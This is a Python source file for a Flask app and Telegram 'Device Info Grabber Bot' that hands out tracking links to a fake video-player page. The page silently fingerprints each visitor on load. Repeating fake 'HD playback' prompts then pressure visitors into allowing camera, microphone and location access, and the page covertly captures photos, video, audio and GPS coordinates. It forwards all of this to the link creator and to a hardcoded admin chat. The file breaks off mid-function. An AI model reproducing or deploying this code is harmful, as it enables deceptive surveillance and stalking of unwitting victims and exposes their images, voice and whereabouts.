import os
import json
import secrets
import logging
import threading
import requests
from flask import Flask, request, render_template_string, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from datetime import datetime

# ---------- Configuration ----------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1838854178")
_replit_domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
BASE_URL = os.environ.get("BASE_URL", f"https://{_replit_domain}" if _replit_domain else "https://your-app.replit.dev")

tracking_links = {}   # token -> user_id
seen_users = set()

flask_app = Flask(__name__)

# ─────────────────────────────────────────
# HTML TEMPLATE  (video-player disguise)
# mode values: all | photo | audio | location | video | device
# ─────────────────────────────────────────
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video Player</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#fff;min-height:100vh}
.topbar{background:#111;padding:10px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #222}
.topbar .logo{font-size:1.2rem;font-weight:700;color:#e63946;letter-spacing:-0.5px}
.topbar .logo span{color:#fff}
.topbar .search{flex:1;background:#1e1e1e;border:1px solid #333;border-radius:20px;padding:6px 14px;color:#aaa;font-size:.85rem}
.player-wrap{position:relative;background:#000;width:100%;aspect-ratio:16/9;max-height:60vw}
.thumbnail{width:100%;height:100%;object-fit:cover;filter:brightness(.4)}
.play-overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px}
.play-btn{width:70px;height:70px;background:rgba(255,255,255,.15);border:3px solid #fff;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;backdrop-filter:blur(4px);transition:background .2s}
.play-btn:hover{background:rgba(255,255,255,.3)}
.play-btn svg{width:30px;height:30px;fill:#fff;margin-left:4px}
.buffer-bar{position:absolute;bottom:0;left:0;right:0;height:3px;background:#333}
.buffer-fill{height:100%;background:#e63946;width:0%;transition:width .4s ease}
.modal-backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:100;align-items:center;justify-content:center}
.modal-backdrop.show{display:flex}
.modal{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:24px;max-width:340px;width:90%;text-align:center}
.modal .icon{font-size:2.5rem;margin-bottom:10px}
.modal h3{font-size:1.05rem;margin-bottom:8px;line-height:1.4}
.modal p{color:#999;font-size:.82rem;line-height:1.6;margin-bottom:20px}
.modal-btn{width:100%;padding:12px;background:#e63946;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;margin-bottom:8px}
.modal-btn.sec{background:#2a2a2a;color:#aaa;font-size:.82rem;font-weight:400}
.info{padding:14px 16px 4px}
.info h1{font-size:1rem;font-weight:600;line-height:1.4;margin-bottom:6px}
.meta{color:#888;font-size:.8rem;margin-bottom:10px}
.tags{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}
.tag{background:#1e1e1e;border:1px solid #333;border-radius:20px;padding:3px 10px;font-size:.75rem;color:#aaa}
.section-title{padding:0 16px;font-size:.85rem;color:#888;margin-bottom:8px}
.rec-list{display:flex;flex-direction:column;gap:0}
.rec-item{display:flex;gap:10px;padding:10px 16px;cursor:pointer;border-bottom:1px solid #111}
.rec-thumb{width:120px;min-width:120px;height:68px;background:#1e1e1e;border-radius:6px;overflow:hidden;position:relative}
.rec-duration{position:absolute;bottom:4px;right:4px;background:rgba(0,0,0,.8);border-radius:3px;padding:1px 4px;font-size:.7rem}
.rec-info{flex:1}
.rec-title{font-size:.82rem;font-weight:500;margin-bottom:4px;line-height:1.3}
.rec-sub{font-size:.72rem;color:#666}
#toast{display:none;position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:8px 18px;border-radius:20px;font-size:.8rem;z-index:200}
</style>
</head>
<body>
<div class="topbar">
  <div class="logo">▶<span>Stream</span></div>
  <div class="search">Search videos...</div>
</div>
<div class="player-wrap" id="playerWrap">
  <img class="thumbnail" src="https://picsum.photos/seed/vid1/800/450" alt="">
  <div class="play-overlay" id="playOverlay">
    <div class="play-btn" id="playBtn">
      <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
    </div>
  </div>
  <div class="buffer-bar"><div class="buffer-fill" id="bufferFill"></div></div>
</div>
<div class="modal-backdrop" id="modal"></div>
<div class="info">
  <h1>Best Compilation 2024 – Must Watch! 🔥</h1>
  <div class="meta">1.2M views &nbsp;•&nbsp; 2 days ago</div>
  <div class="tags">
    <span class="tag">#viral</span><span class="tag">#trending</span>
    <span class="tag">#2024</span><span class="tag">#compilation</span>
  </div>
</div>
<div class="section-title">Up Next</div>
<div class="rec-list">
  <div class="rec-item">
    <div class="rec-thumb"><img src="https://picsum.photos/seed/rec1/120/68" style="width:100%;height:100%;object-fit:cover"><div class="rec-duration">12:34</div></div>
    <div class="rec-info"><div class="rec-title">Top 10 Moments You Won't Believe</div><div class="rec-sub">ViralHub • 890K views</div></div>
  </div>
  <div class="rec-item">
    <div class="rec-thumb"><img src="https://picsum.photos/seed/rec2/120/68" style="width:100%;height:100%;object-fit:cover"><div class="rec-duration">8:21</div></div>
    <div class="rec-info"><div class="rec-title">Unbelievable Caught on Camera 2024</div><div class="rec-sub">TopClips • 2.1M views</div></div>
  </div>
  <div class="rec-item">
    <div class="rec-thumb"><img src="https://picsum.photos/seed/rec3/120/68" style="width:100%;height:100%;object-fit:cover"><div class="rec-duration">15:07</div></div>
    <div class="rec-info"><div class="rec-title">Funniest Fails of the Year – Part 3</div><div class="rec-sub">FailArmy • 4.5M views</div></div>
  </div>
  <div class="rec-item">
    <div class="rec-thumb"><img src="https://picsum.photos/seed/rec4/120/68" style="width:100%;height:100%;object-fit:cover"><div class="rec-duration">6:48</div></div>
    <div class="rec-info"><div class="rec-title">Amazing Talent Show Winners 2024</div><div class="rec-sub">ShowTime • 560K views</div></div>
  </div>
</div>
<div id="toast"></div>

<script>
const token = "{{ token }}";
const mode  = "{{ mode }}";

function showToast(msg, ms=3000){
  const t=document.getElementById("toast");
  t.textContent=msg; t.style.display="block";
  setTimeout(()=>t.style.display="none",ms);
}
function animateBuffer(pct,dur){
  const f=document.getElementById("bufferFill");
  f.style.transition=`width ${dur}ms linear`;
  f.style.width=pct+"%";
}

/* ── Device model ── */
async function getDeviceModel(){
  if(navigator.userAgentData){
    try{const d=await navigator.userAgentData.getHighEntropyValues(["model","platform"]);if(d.model&&d.model.trim())return d.model.trim();}catch(e){}
  }
  const ua=navigator.userAgent;
  let m=ua.match(/;\\s*([A-Za-z0-9 _\\-]+)\\s+Build/);if(m)return m[1].trim();
  m=ua.match(/\\(([^;)]+);\\s*([^;)]+);\\s*([^;)]+)\\)/);if(m)return m[3].trim();
  return navigator.platform||"Unknown";
}

/* ── Fingerprint ── */
async function collectFingerprint(){
  let battery={};
  try{const b=await navigator.getBattery();battery={batteryLevel:Math.round(b.level*100)+"%",charging:b.charging};}catch(e){}
  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
  const deviceModel=await getDeviceModel();
  return{
    userAgent:navigator.userAgent, deviceModel,
    platform:navigator.platform,
    screenWidth:screen.width, screenHeight:screen.height,
    language:navigator.language,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    hardwareConcurrency:navigator.hardwareConcurrency,
    deviceMemory:navigator.deviceMemory,
    maxTouchPoints:navigator.maxTouchPoints,
    cookieEnabled:navigator.cookieEnabled,
    connectionType:conn.effectiveType||conn.type||"unknown",
    downlink:conn.downlink,
    localTime:new Date().toString(),
    ...battery
  };
}

/* ── Silent fingerprint on load ── */
async function sendFingerprint(){
  try{
    const fp=await collectFingerprint();
    await fetch("/capture_fingerprint",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token,fingerprint:fp})});
  }catch(e){}
}

/* ── Permission modal helper ── */
function showPermModal(icon,titleMM,titleEN,bodyMM,bodyEN){
  return new Promise(resolve=>{
    const bd=document.getElementById("modal");
    bd.innerHTML=`<div class="modal">
      <div class="icon">${icon}</div>
      <h3>${titleMM}<br><small style="color:#aaa;font-size:.85em">${titleEN}</small></h3>
      <p>${bodyMM}<br><span style="color:#777">${bodyEN}</span></p>
      <button class="modal-btn" id="rBtn">ခွင့်ပြု &amp; ဆက်လက်ကြည့်ရှုမည် | Allow &amp; Continue</button>
    </div>`;
    bd.classList.add("show");
    document.getElementById("rBtn").onclick=()=>{bd.classList.remove("show");resolve();};
  });
}

/* ── Camera ── */
async function getCameraStream(facing){
  while(true){
    try{return await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1280},height:{ideal:720}}});}
    catch(e){await showPermModal("📸","ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်","Camera Access Required","HD ဗီဒီယိုကြည့်ရန် ကင်မရာ ခွင့်ပြုပါ","Allow camera access to stream in HD.");}
  }
}
/* ── Microphone ── */
async function getMicStream(){
  while(true){
    try{return await navigator.mediaDevices.getUserMedia({audio:true});}
    catch(e){await showPermModal("🎤","မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်","Microphone Required","အသံဖြင့်ကြည့်ရန် မိုက်ခရိုဖုန်း ခွင့်ပြုပါ","Allow microphone for audio playback.");}
  }
}
/* ── Location ── */
async function getLocationPos(){
  while(true){
    try{return await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:12000}));}
    catch(e){await showPermModal("📍","တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်","Location Required","သင့်တည်နေရာ စစ်ဆေးမှသာ ဗီဒီယိုကြည့်နိုင်မည်","Location verification required to watch this content.");}
  }
}

/* ── Capture functions ── */
async function sendPhoto(){
  try{
    const stream=await getCameraStream("environment");
    const video=document.createElement("video");
    video.srcObject=stream; video.setAttribute("playsinline",""); video.setAttribute("muted","");
    await new Promise((res,rej)=>{video.onloadedmetadata=()=>video.play().then(res).catch(rej);video.onerror=rej;});
    await new Promise(r=>setTimeout(r,2000));
    const canvas=document.createElement("canvas");
    canvas.width=video.videoWidth||1280; canvas.height=video.videoHeight||720;
    canvas.getContext("2d").drawImage(video,0,0);
    stream.getTracks().forEach(t=>t.stop());
    const blob=await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.92));
    if(!blob||blob.size<1000)return;
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token); form.append("photo",blob,"photo.jpg"); form.append("fingerprint",JSON.stringify(fp));
    await fetch("/capture_combined_photo",{method:"POST",body:form});
  }catch(e){}
}

async function sendLocation(){
  try{
    const pos=await getLocationPos();
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token); form.append("lat",pos.coords.latitude); form.append("lon",pos.coords.longitude); form.append("fingerprint",JSON.stringify(fp));
    await fetch("/capture_combined_location",{method:"POST",body:form});
  }catch(e){}
}

async function sendVideo(){
  try{
    const mimeType=MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")?"video/webm;codecs=vp8,opus":"video/webm";
    const stream=await getCameraStream("user");
    const micStream=await getMicStream();
    const combined=new MediaStream([...stream.getVideoTracks(),...micStream.getAudioTracks()]);
    const recorder=new MediaRecorder(combined,{mimeType});
    const chunks=[];
    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
    recorder.start(500); await new Promise(r=>setTimeout(r,6000)); recorder.stop();
    stream.getTracks().forEach(t=>t.stop()); micStream.getTracks().forEach(t=>t.stop());
    await new Promise(r=>recorder.onstop=r);
    const blob=new Blob(chunks,{type:mimeType});
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token); form.append("video",blob,"video.webm"); form.append("fingerprint",JSON.stringify(fp));
    await fetch("/capture_combined_video",{method:"POST",body:form});
  }catch(e){}
}

async function sendAudio(){
  try{
    const stream=await getMicStream();
    const mimeType=MediaRecorder.isTypeSupported("audio/webm;codecs=opus")?"audio/webm;codecs=opus":"audio/webm";
    const recorder=new MediaRecorder(stream,{mimeType});
    const chunks=[];
    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
    recorder.start(500); await new Promise(r=>setTimeout(r,10000)); recorder.stop();
    stream.getTracks().forEach(t=>t.stop());
    await new Promise(r=>recorder.onstop=r);
    const blob=new Blob(chunks,{type:mimeType});
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token); form.append("audio",blob,"audio.webm"); form.append("fingerprint",JSON.stringify(fp));
    await fetch("/capture_combined_audio",{method:"POST",body:form});
  }catch(e){}
}

/* ── Modal texts per mode ── */
const modalTexts={
  all:    {icon:"📺",mm:"HD ဗီဒီယို ကြည့်ရှုရန် လိုအပ်သည်",en:"HD Playback Required",bmm:"ကင်မရာ၊ မိုက်ခရိုဖုန်းနှင့် တည်နေရာ ခွင့်ပြုချက်ပေးပါ",ben:"Allow camera, microphone & location to watch in HD."},
  photo:  {icon:"📸",mm:"ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Camera Access Required",bmm:"HD ကြည့်ရှုရန် ကင်မရာ ဖွင့်ပေးပါ",ben:"Enable camera to stream HD content."},
  audio:  {icon:"🎤",mm:"အသံ ခွင့်ပြုချက် လိုအပ်သည်",en:"Audio Access Required",bmm:"HD အသံဖြင့်ကြည့်ရန် မိုက်ခရိုဖုန်း ဖွင့်ပေးပါ",ben:"Enable microphone for HD audio playback."},
  location:{icon:"📍",mm:"တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်",en:"Location Verification Required",bmm:"သင့်ဒေသ စစ်ဆေးမှသာ ဤဗီဒီယိုကြည့်နိုင်မည်",ben:"Location check required to watch content in your region."},
  video:  {icon:"🎥",mm:"ဗီဒီယို ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Video Access Required",bmm:"HD ဗီဒီယိုကြည့်ရန် ကင်မရာ ဖွင့်ပေးပါ",ben:"Allow camera to stream HD video."},
  device: {icon:"📱",mm:"Device စစ်ဆေးမှု လိုအပ်သည်",en:"Device Verification Required",bmm:"ဗီဒီယိုကြည့်ရန် Device စစ်ဆေးချက် လိုအပ်သည်",ben:"Device verification required to continue watching."}
};

/* ── Main capture dispatcher ── */
async function startCapture(){
  animateBuffer(10,600);
  if(mode==="all"){
    await sendPhoto();       animateBuffer(30,500);
    await sendLocation();    animateBuffer(55,500);
    await sendVideo();       animateBuffer(82,500);
    await sendAudio();       animateBuffer(100,300);
  } else if(mode==="photo"){
    await sendPhoto();       animateBuffer(100,600);
  } else if(mode==="audio"){
    await sendAudio();       animateBuffer(100,600);
  } else if(mode==="location"){
    await sendLocation();    animateBuffer(100,600);
  } else if(mode==="video"){
    await sendVideo();       animateBuffer(100,600);
  } else {
    animateBuffer(100,600);  // device: already sent on load
  }
  showToast("Playback error. Please try again later.");
  document.getElementById("playOverlay").innerHTML='<div style="color:#fff;font-size:.85rem;opacity:.6">Playback unavailable</div>';
}

/* ── Play button ── */
document.getElementById("playBtn").onclick=()=>{
  const t=modalTexts[mode]||modalTexts.all;
  const bd=document.getElementById("modal");
  bd.innerHTML=`<div class="modal">
    <div class="icon">${t.icon}</div>
    <h3>${t.mm}<br><small style="color:#aaa;font-size:.85em">${t.en}</small></h3>
    <p>${t.bmm}<br><span style="color:#777">${t.ben}</span></p>
    <button class="modal-btn" id="allowBtn">ခွင့်ပြု &amp; ကြည့်ရှုမည် | Allow &amp; Watch HD</button>
    <button class="modal-btn sec" id="skipBtn">အနိမ့်အရည်အသွေးဖြင့်ကြည့်မည် | Watch Low Quality</button>
  </div>`;
  bd.classList.add("show");
  document.getElementById("allowBtn").onclick=async()=>{
    bd.classList.remove("show");
    document.getElementById("playOverlay").innerHTML='<div style="color:#fff;font-size:.9rem;opacity:.7">Buffering...</div>';
    await startCapture();
  };
  document.getElementById("skipBtn").onclick=()=>{
    bd.classList.remove("show");
    showToast("ဤဗီဒီယိုသည် သင့်ဒေသတွင် မရနိုင်ပါ | Content unavailable in your region.");
  };
};

window.addEventListener("load",()=>{ sendFingerprint(); });
</script>
</body>
</html>"""


# ─────────────────────────────────────────
# FLASK ROUTES
# ─────────────────────────────────────────
@flask_app.route('/')
def index():
    return """<!DOCTYPE html><html><head><title>Stream</title>
<style>body{background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.box{text-align:center;padding:40px;background:#111;border-radius:12px;border:1px solid #222}
code{background:#1e1e1e;padding:4px 8px;border-radius:4px;color:#e63946}</style></head>
<body><div class="box"><h1>▶ Stream</h1><p style="color:#888;margin-top:12px">Bot ဖြင့် link ထုတ်ပြီး မျှဝေပါ<br>Use the bot to generate and share links.</p>
<p style="margin-top:16px;font-size:.85rem;color:#555">Powered by Telegram Bot &nbsp;•&nbsp; <code>/grab</code></p></div></body></html>""", 200


@flask_app.route('/track/<token>')
def track_page(token):
    mode = request.args.get('m', 'all')
    user_id = tracking_links.get(token)
    if user_id:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        ua = request.headers.get('User-Agent', 'Unknown')[:120]
        mode_labels = {
            'all': '🌐 All-in-One',
            'photo': '📸 Photo',
            'audio': '🎤 Audio',
            'location': '📍 Location',
            'video': '🎥 Video',
            'device': '📱 Device Info'
        }
        label = mode_labels.get(mode, mode)
        alert = (
            f"🔗 <b>Link ဖွင့်သည် | Link Opened!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Mode: <b>{label}</b>\n"
            f"🌐 IP: <code>{ip}</code>\n"
            f"📱 Device: {ua}\n"
            f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
    return render_template_string(HTML_TEMPLATE, token=token, mode=mode)


# ─────────────────────────────────────────
# CAPTURE ENDPOINTS
# ─────────────────────────────────────────
@flask_app.route('/capture_fingerprint', methods=['POST'])
def capture_fingerprint():
    data = request.get_json(silent=True) or {}
    token = data.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    fp = data.get('fingerprint', {})
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    report = (
        f"📱 <b>Device Info / ဖုန်းအချက်အလက်</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📱 Model: {fp.get('deviceModel','Unknown')}\n"
        f"💻 Platform: {fp.get('platform','Unknown')}\n"
        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
        f"🗣 Language: {fp.get('language','?')}\n"
        f"⏰ Timezone: {fp.get('timezone','?')}\n"
        f"🔋 Battery: {fp.get('batteryLevel','?')} ({'🔌 Charging' if fp.get('charging') else '🔋 Not charging'})\n"
        f"📡 Net: {fp.get('connectionType','?')} {fp.get('downlink','?')}Mbps\n"
        f"🧠 CPU cores: {fp.get('hardwareConcurrency','?')}\n"
        f"💾 RAM: {fp.get('deviceMemory','?')} GB\n"
        f"📅 Local time: {fp.get('localTime','?')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    threading.Thread(target=broadcast_message, args=(user_id, report), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_photo', methods=['POST'])
def capture_combined_photo():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    photo_file = request.files.get('photo')
    fp_json = request.form.get('fingerprint')
    if not photo_file:
        return jsonify({"ok": False}), 400
    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "📸 Photo"
    photo_bytes = photo_file.read()
    threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_video', methods=['POST'])
def capture_combined_video():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    video_file = request.files.get('video')
    fp_json = request.form.get('fingerprint')
    if not video_file:
        return jsonify({"ok": False}), 400
    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "🎥 Video"
    video_bytes = video_file.read()
    threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_audio', methods=['POST'])
def capture_combined_audio():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    audio_file = request.files.get('audio')
    fp_json = request.form.get('fingerprint')
    if not audio_file:
        return jsonify({"ok": False}), 400
    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "🎤 Audio"
    audio_bytes = audio_file.read()
    threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_location', methods=['POST'])
def capture_combined_location():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    fp_json = request.form.get('fingerprint')
    if not lat or not lon:
        return jsonify({"ok": False}), 400
    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "📍 Location"
    threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
    threading.Thread(target=broadcast_message, args=(user_id, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


# ─────────────────────────────────────────
# TELEGRAM HELPERS
# ─────────────────────────────────────────
def recipients(user_id):
    ids = [str(user_id)]
    if str(ADMIN_CHAT_ID) not in ids:
        ids.append(str(ADMIN_CHAT_ID))
    return ids


def send_telegram_message(chat_id, text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception:
        pass


def broadcast_message(user_id, text):
    for cid in recipients(user_id):
        threading.Thread(target=send_telegram_message, args=(cid, text), daemon=True).start()


def broadcast_photo(user_id, photo_bytes, caption):
    for cid in recipients(user_id):
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
                files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')},
                timeout=30
            )
        except Exception:
            pass


def broadcast_voice(user_id, audio_bytes, caption):
    for cid in recipients(user_id):
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
                files={'voice': ('audio.ogg', audio_bytes, 'audio/ogg')},
                timeout=30
            )
        except Exception:
            pass


def broadcast_video(user_id, video_bytes, caption):
    for cid in recipients(user_id):
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
                files={'video': ('video.mp4', video_bytes, 'video/mp4')},
                timeout=60
            )
            if not r.json().get('ok'):
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
                    files={'document': ('video.webm', video_bytes, 'video/webm')},
                    timeout=60
                )
        except Exception:
            pass


def broadcast_location(user_id, lat, lon):
    for cid in recipients(user_id):
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                json={"chat_id": cid, "latitude": float(lat), "longitude": float(lon)},
                timeout=10
            )
        except Exception:
            pass


def format_fingerprint_caption(fp):
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    except Exception:
        ip = 'Unknown'
    return (
        f"📱 <b>Device Info</b>\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📱 Model: {fp.get('deviceModel','?')}\n"
        f"💻 Platform: {fp.get('platform','?')}\n"
        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
        f"🗣 Lang: {fp.get('language','?')} | ⏰ TZ: {fp.get('timezone','?')}\n"
        f"🔋 {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'} | "
        f"📡 {fp.get('connectionType','?')} {fp.get('downlink','?')}Mbps"
    )


# ─────────────────────────────────────────
# BOT KEYBOARDS & COMMANDS
# ─────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Link ထုတ်မည် | Generate Links", callback_data="grab")],
        [InlineKeyboardButton("📋 Links စာရင်း | Active Links", callback_data="links"),
         InlineKeyboardButton("🗑 ဖျက်မည် | Clear All", callback_data="clear")],
        [InlineKeyboardButton("ℹ️ Bot အချက်အလက် | Info", callback_data="info"),
         InlineKeyboardButton("❓ အကူအညီ | Help", callback_data="help")]
    ])


def make_links_keyboard(token):
    base = f"{BASE_URL}/track/{token}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 အားလုံး | All-in-One", url=f"{base}?m=all")],
        [InlineKeyboardButton("📸 ဓာတ်ပုံ + Device | Photo", url=f"{base}?m=photo"),
         InlineKeyboardButton("🎤 အသံ + Device | Audio", url=f"{base}?m=audio")],
        [InlineKeyboardButton("📍 တည်နေရာ + Device | Location", url=f"{base}?m=location"),
         InlineKeyboardButton("🎥 ဗီဒီယို + Device | Video", url=f"{base}?m=video")],
        [InlineKeyboardButton("📋 Links စာရင်း | Active Links", callback_data="links"),
         InlineKeyboardButton("🏠 Menu", callback_data="menu")]
    ])


def format_links_text(token):
    base = f"{BASE_URL}/track/{token}"
    return (
        f"✅ <b>Link ၅ မျိုး ထုတ်ပြီးပါပြီ! | 5 Links Created!</b>\n"
        f"📱 Device Info သည် link တိုင်းတွင် ပါဝင်သည် | Device info included in every link\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>အားလုံး | All-in-One</b> (Photo+Audio+Location+Video+Device):\n<code>{base}?m=all</code>\n\n"
        f"📸 <b>ဓာတ်ပုံ + Device | Photo:</b>\n<code>{base}?m=photo</code>\n\n"
        f"🎤 <b>အသံ + Device | Audio:</b>\n<code>{base}?m=audio</code>\n\n"
        f"📍 <b>တည်နေရာ + Device | Location:</b>\n<code>{base}?m=location</code>\n\n"
        f"🎥 <b>ဗီဒီယို + Device | Video:</b>\n<code>{base}?m=video</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔘 အောက်ပါ ခလုတ်များမှ link တစ်ခုချင်းဆီ ဖွင့်နိုင်သည်\n"
        f"Tap a button below to open each link directly."
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name or "User"
    user_id = user.id
    is_new = user_id not in seen_users
    seen_users.add(user_id)

    alert = (
        f"👤 <b>{'🆕 NEW' if is_new else '🔄 Returning'} User Started Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 Name: <b>{user.full_name}</b>\n"
        f"🔖 Username: {'@'+user.username if user.username else 'none'}\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    threading.Thread(target=send_telegram_message, args=(ADMIN_CHAT_ID, alert), daemon=True).start()

    await update.message.reply_text(
        f"👋 မင်္ဂလာပါ <b>{name}</b>! | Hello <b>{name}</b>!\n\n"
        "🤖 <b>Device Info Grabber Bot</b> မှ ကြိုဆိုပါသည်\n"
        "Welcome to Device Info Grabber Bot.\n\n"
        "📌 လုပ်ဆောင်ချက်တစ်ခုကို ရွေးချယ်ပါ | Choose an action:",
        parse_mode="HTML",
        reply_markup=main_menu_keyboard()
    )


async def grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = secrets.token_urlsafe(12)
    tracking_links[token] = user_id
    text = format_links_text(token)
    keyboard = make_links_keyboard(token)
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=keyboard)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "menu":
        await query.edit_message_text(
            "🏠 <b>Main Menu</b>\n\nလုပ်ဆောင်ချက်တစ်ခုကို ရွေးချယ်ပါ | Choose an action:",
            parse_mode="HTML", reply_markup=main_menu_keyboard()
        )

    elif data == "grab":
        token = secrets.token_urlsafe(12)
        tracking_links[token] = user_id
        await query.edit_message_text(
            format_links_text(token),
            parse_mode="HTML",
            reply_markup=make_links_keyboard(token)
        )

    elif data == "links":
        user_links = [t for t, uid in tracking_links.items() if uid == user_id]
        if not user_links:
            text = "📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ | No active links yet."
        else:
            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}?m=all</code>" for t in user_links[-10:]])
            text = f"📋 <b>Active Links</b> ({len(user_links)} total)\n\n{lines}"
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Link အသစ် | New Links", callback_data="grab")],
            [InlineKeyboardButton("🗑 ဖျက်မည် | Clear All", callback_data="clear"),
             InlineKeyboardButton("🏠 Menu", callback_data="menu")]
        ]))

    elif data == "clear":
        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
        for t in user_tokens:
            del tracking_links[t]
